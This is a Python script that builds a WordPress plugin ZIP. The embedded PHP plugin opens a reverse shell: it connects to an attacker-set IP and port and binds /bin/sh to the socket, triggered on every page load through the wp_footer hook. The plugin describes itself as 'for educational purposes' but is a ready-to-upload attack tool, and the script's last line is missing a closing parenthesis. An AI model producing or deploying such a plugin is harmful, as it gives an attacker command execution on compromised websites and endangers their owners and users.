import zipfile
import os

# Create plugin directory
plugin_dir = "reverse-shell-plugin"
os.mkdir(plugin_dir)

# Plugin file content
plugin_code = """<?php
/*
Plugin Name: Reverse Shell Plugin
Description: A WordPress plugin that creates a reverse shell for educational purposes.
Version: 1.0
Author: Your Name
*/

function reverse_shell() {
    // Set your IP address and port
    $ip = 'YOUR_IP_ADDRESS';
    $port = YOUR_PORT;

    // Set up a socket
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/sh', array(
        0 => $sock,
        1 => $sock,
        2 => $sock
    ), $pipes);
}

add_action('wp_footer', 'reverse_shell');
?>
"""

# Write plugin code to file
with open(os.path.join(plugin_dir, "reverse-shell.php"), "w") as f:
    f.write(plugin_code)

# Create the zip file
zip_filename = "reverse-shell-plugin.zip"
with zipfile.ZipFile(zip_filename, 'w') as zipf:
    zipf.write(os.path.join(plugin_dir, "reverse-shell.php"), arcname="reverse-shell.php")

# Cleanup
os.remove(os.path.join(plugin_dir, "reverse-shell.php"))
os.rmdir(plugin_dir
